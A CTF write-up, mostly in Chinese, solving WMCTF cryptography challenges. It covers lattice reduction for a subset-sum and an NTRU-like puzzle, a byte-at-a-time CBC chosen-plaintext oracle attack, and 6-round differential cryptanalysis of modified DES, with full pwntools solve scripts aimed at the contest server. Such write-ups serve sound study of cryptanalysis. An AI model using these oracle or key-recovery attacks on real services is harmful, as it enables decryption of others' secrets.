一个安卓逆向,字符串都被加密了,看了一下调用了native的check函数,在ida里看了一下check函数,判断长度是不是32,然后取出偶数位,使用AES加密,然后用加密的结果,作为祖冲之算法的密钥加密全部的flag.
后来改题了AES生成的那个祖冲之算法的key,是已知的了,然后因为那个是流加密,所以直接把加密后的flag带回去就拿到flag了.

##	Crypto
### babySum

Random BKZ Blocksize 24

```python=
from json import load
import re

def check(sol, A):
    s = 0
    for x, a in zip(sol, A):
        s += x*a
    return s

k, n, d = 20, 120, 0.8
s, A = load(open("data", "r"))

N = 50
BS = 24

lat = []
for i, a in enumerate(A):
    lat.append([1*(j == i) for j in range(n)] + [N*a] + [N])
lat.append([0]*n + [N*s] + [k*N])

itr = 0
while True:
    itr += 1
    print(itr)
    nums = lat[::]
    shuffle(nums)
    m = matrix(ZZ, nums)
    ml = m.BKZ(block_size=BS)
    for i, row in enumerate(ml):
        if not (-1 <= min(row[:-1]) and max(row[:-1]) <= 1):
            continue
        for i in range(len(row)):
            if row[i] < 0:
                row[i] *= -1
        temp_bool = (check(row, A) == s)
        if temp_bool == True:
            print(i, row)
            quit()
```

![](https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png)

### piece_of_cake

二维格可以用高斯格基规约，多试几组数据就可以跑出来了

```python=
from gmpy2 import iroot, sqrt
from Crypto.Util.number import *
from pwn import remote
import string
from hashlib import sha256

r = remote('81.68.174.63', 8631)


def proof_of_work(txt, Hash):
    S = string.ascii_letters+string.digits
    for a in S:
        for b in S:
            for c in S:
                if sha256((a+b+c+txt).encode()).hexdigest() == Hash:
                    print(a+b+c)
                    return a+b+c


def gaussian(v1, v2):
    while True:
        if sqrt(v2[0]**2+v2[1]**2) < sqrt(v1[0]**2+v1[1]**2):
            v1, v2 = v2, v1
        m = int((v1[0]*v2[0]+v1[1]*v2[1])/(v1[0]**2+v1[1]**2))
        if m == 0:
            return (v1, v2)
        v2 = [v2[0]-m*v1[0], v2[1]-m*v1[1]]


r.recvuntil("XXX+")
nonce = r.recv(17).decode()
r.recvuntil(" == ")
target = r.recv(64).decode()
r.recvuntil("\nGive me XXX:")
w = proof_of_work(nonce, target)
r.send(str(w)+"\n")
print("----------proof of work is ok!----------")
temp = r.recvuntil("What's your choice?\n")
r.send("1\n")
temp = r.recvline()
temp = r.recvline().strip().decode().split(" ")
q, h, c = [int(i) for i in temp]
N = int(r.recvline().strip().decode())
cip = int(r.recvline().strip().decode())
s1, s2 = gaussian([1, h], [0, q])
f, g = s1[0], s1[1]
cake = (c*f % q) % g
cake = inverse(f, g)*cake % g
for k in range(100000):
    if pow(cake+k*g, 0x10001, N) == cip:
        cake = cake+k*g
        print("cake is: ", cake)
        break
r.send(str(cake)+"\n")
print(r.recvline().strip().decode())
#WMCTF{Wh4t_A_pi3ce_of_CAKE!}
```



###    Game
```python=
from pwn import remote
from hashlib import sha256
from Crypto.Util.number import *
import string
import os
r = remote('81.68.174.63', 16442)


def proof_of_work(txt, Hash):
    S = string.ascii_letters+string.digits
    for a in S:
        for b in S:
            for c in S:
                for d in S:
                    if sha256((a+b+c+d+txt).encode()).hexdigest() == Hash:
                        print(a+b+c+d)
                        return a+b+c+d

def select_x(x):
    r.recvuntil("3. exit\n")
    r.recvuntil(">")
    r.send(str(x))
    r.recvuntil("(in hex): ")


r.recvuntil("XXXX+")
nonce = r.recv(16).decode()
r.recvuntil(" == ")
target = r.recv(64).decode()
print("waiting....")
w = proof_of_work(nonce, target)
r.send(str(w))
print("----------proof of work is ok!----------")
r.recvuntil("IV is: ")
IV = r.recv(32).decode()  # 16 bytes -> 32 hexlength
print("IV is: {}".format(IV))


secret = b""
for Byte in range(48):#Byte和执行前secret的已知长度是等价的 15 = byte_len+Byte mod 16
    byte_len = (15 - (Byte % 16)) if ((Byte % 16) != 15) else 16
    bound = ((byte_len + Byte + 1) // 16) * 32 # 应该相等的范围应该是[bound-32:bound]
    select_x(1)
    r_ = os.urandom(byte_len)
    r.send(r_.hex())
    C_ = r.recvline().strip().decode()
    C0 = IV if bound==32 else C_[bound-64:bound-32]
    IV = C_[-32:] # 每次加密后及时更新IV
    print("brute force {} byte".format(Byte+1))
    for i in range(256):
        select_x(1)
        Pi = int(C0, 16) ^ int(IV, 16) ^ int((r_.hex()+secret.hex())[-30:]+long_to_bytes(i).hex(), 16)
        r.send(long_to_bytes(Pi).hex())
        Ci = r.recvline().strip().decode()
        IV = Ci[-32:]
        if Ci[:32] == C_[bound-32:bound]:
            secret += long_to_bytes(i)
            print("Current secret: {}".format(secret))
            break
    

print("secret is: {}".format(secret))
select_x(2)
r.send(secret.hex())
flag = r.recvline().strip().decode()
print(flag)
#WMCTF{Dont_ever_tell_anybody_anything___If_you_do__you_start_missing_everybody}
```

### idiot box

**Second Blood**

改过的DES 6轮差分攻击

现学：
- https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41
- http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf

> 现学材料里一个可能的疑惑点：第4轮的F函数中，有5个sbox的input(6bit)的差分值都是0，所以这5个sbox的output(4bit)的差分值也都是0，经过P置换后，得到的D'中有4*5=20bit是已知的，所以后面第6轮的F函数的output的差分值:$F' = c' \oplus D' \oplus T_L'$中，有20bit是确定的；经过**逆**P置换后，得到第6轮8个sbox的outputs的差分值，其中有5个对应的sbox的output的差分值是已知的，所以能用medium里的那个方法把这5个sbox的key求出来。
> 
> c'为第3个F函数input的差分值，D'为第4个F函数input的差分值，F'为第6个F函数output的差分值，$T_L'$是密文左半部分的差分值。

**攻击方法**

DES里面就sbox比较难搞，其他的部分就是一些线性置换，可以通过一些差分特性去操作一下这个sbox，然后就能得到key。

简单来说就是，找到一个差分特征后，可以用这个特征推4轮，然后计算$F' = c' \oplus D' \oplus T_L'$（第6轮F函数output的差分值），逆P置换，得到8个sbox的outputs的差分值out_xors，这个差分值的概率是最大的；接着，将2个已知的第6轮F函数的input（密文的右半部分）去做e扩展，得到$I_1, I_2$，分别分成8组$\{i_{11}, i_{12}, ..., i_{18}\}, \{i_{21}, i_{22}, ..., i_{28}\}$，对应着8个sbox。

每一个sbox，对所有可能的64种key（6bit）作判断sbox($i_{1j}$ ^ key) ^ sbox($i_{2j}$ ^ key) == out_xors[j]，如果等于，则将该key计数加1。尝试很多次后，必然有一个key出现的次数最多，且远超其他的key，该key即为正确的key。

这8个6bit的key合起来就是第6轮的subkey，又由于密钥扩展就是一个置换，可以反推出前面5轮的key。

把key反过来加密就能getflag。

**手动寻找差分特征**

```python
from collections import Counter

...

def gen_diff_output(diff):
    p1 = getRandomNBitInteger(32)
    p2 = p1 ^ diff
    k = getRandomNBitInteger(48)
    c1, c2 = F(p1, k), F(p2, k)
    return c1^c2, (p1,p2,c1,c2)


counter = Counter()
for i in range(10000):
    P_ = 0x00000040
    X_, _ = gen_diff_output(P_)
    counter[X_] += 1

X_, freq = counter.most_common(1)[0]
print(hex(X_)[2:].rjust(8,'0'), freq / 10000)

# 0x00000002 -> 0x00000002    0.217
# 0x00000040 -> 0x00000000    0.2534
# 0x00000400 -> 0x00000000    0.251
# 0x00000000 -> 0x00000000    1
# 0x00002000 -> 0x00000000    0.25
# 0x00004000 -> 0x00000040    0.22
# 0x00020000 -> 0x00020000    0.18
```
发现了好几组非常优秀的差分特征。

以前我么得选择，现在我随便选。

就选这个0x00000040 -> 0x00000000 0.2534

**画图分析**

![](https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png)

> 在线画图：https://draw.io

可以推出来$F' = 0x00000040 \oplus T_L'$


**获取数据**
```python3
import re
from json import dump

from tqdm import tqdm
from Crypto.Util.number import long_to_bytes, getRandomNBitInteger
from pwn import *

def gen_diff_input(diff):
    p1 = getRandomNBitInteger(64)
    p2 = p1 ^ diff
    return p1, p2


r = remote("81.68.174.63", 34129)
# context.log_level = "debug"

rec = r.recvuntil(b"required").decode()
cipher_flag = re.findall(r"\n([0-9a-f]{80})\n", rec)[0]
print(cipher_flag)
r.recvline()

pairs = []
for i in tqdm(range(10000)):
    p1, p2 = gen_diff_input(0x0000000000000040)
    r.sendline(long_to_bytes(p1).hex().encode())
    c1 = int(r.recvline(keepends=False), 16)
    r.sendline(long_to_bytes(p2).hex().encode())
    c2 = int(r.recvline(keepends=False), 16)
    pairs.append(((p1,p2), (c1,c2)))

r.close()


dump([cipher_flag, pairs], open("data", "w"))
```

**差分攻击**

```python
from collections import Counter
from json import load
from tqdm import tqdm


cipher_flag, pairs = load(open("data", "r"))

...


def inv_key(key):
    inv_key = [0]*48
    key_bin = bin(key)[2:].rjust(48, '0')
    for j in range(48):
        inv_key[pc_key[j]] = key_bin[j]
    return int(''.join(inv_key), 2)

def inv_keys(k6):
    keys = [0]*6
    keys[-1] = k6
    for i in range(4,-1,-1):
        keys[i] = inv_key(keys[i+1])
    return keys

def inv_p(x):
    x_bin = [int(_) for _ in bin(x)[2:].rjust(32, '0')]
    y_bin = [0]*32
    for i in range(32):
        y_bin[pbox[i]] = x_bin[i]
    y = int(''.join([str(_) for _ in y_bin]), 2)
    return y

# --------------------------
candidate_keys = [Counter() for _ in range(8)]

for _, cs in tqdm(pairs):
    c1, c2 = cs
    if c1 ^ c2 == 0x0000004000000000:
        continue

    l1, l2 = c1 >> 32, c2 >> 32
    r1, r2 = c1 & 0xffffffff, c2 & 0xffffffff
    # print(r1, r2)

    F_ = l1^l2^0x00000040
    F_ = inv_p(F_) # xor of the two outputs of sbox, 32bit

    Ep1 = e(r1) # 48bit
    Ep2 = e(r2) # 48bit

    for i in range(8):
        inp1 = (Ep1 >> (7-i)*6) & 0b111111   # 6bit
        inp2 = (Ep2 >> (7-i)*6) & 0b111111   # 6bit
        out_xor = (F_ >> (7-i)*4) & 0b1111   # 4bit
        for key in range(64):
            if s(inp1^key, i) ^ s(inp2^key, i) == out_xor:
                candidate_keys[i][key] += 1

print(candidate_keys)


# ----------------------
key6 = []
for c in candidate_keys:
    print(c.most_common(2))
    key6.append(c.most_common(1)[0][0])

print(key6)
# key6 = [53, 44, 38, 7, 7, 30, 29, 52]
k6 = sum(key6[i]<<(7-i)*6 for i in range(8))
# k6 = 236161043654516
keys = inv_keys(k6)
print(keys)

ps, cs = pairs[0]
p1, c1 = ps[0], cs[0]
assert enc_block(p1) == c1
# Ok! key is right!

# To decrypt, reverse the keys.
keys = keys[::-1]
print(enc(bytes.fromhex(cipher_flag)))
# b'WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}\x00\x00\x00\x00'
```

WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}
